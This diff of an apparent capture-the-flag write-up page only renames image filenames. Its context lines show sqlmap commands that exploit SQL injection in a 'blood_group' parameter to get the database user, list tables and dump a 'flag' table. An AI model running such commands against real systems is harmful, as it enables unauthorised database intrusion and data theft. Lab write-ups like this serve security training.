@@ -43,13 +43,13 @@ blood_group=A%2B
 $ sqlmap -r req.txt -p blood_group --current-user
 ```
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 $ sqlmap -r req.txt -p blood_group -D blood --tables
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 $ sqlmap -r req.txt -p blood_group -D blood -T flag --dump
@@ -57,7 +57,7 @@ $ sqlmap -r req.txt -p blood_group -D blood -T flag --dump
 
 
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
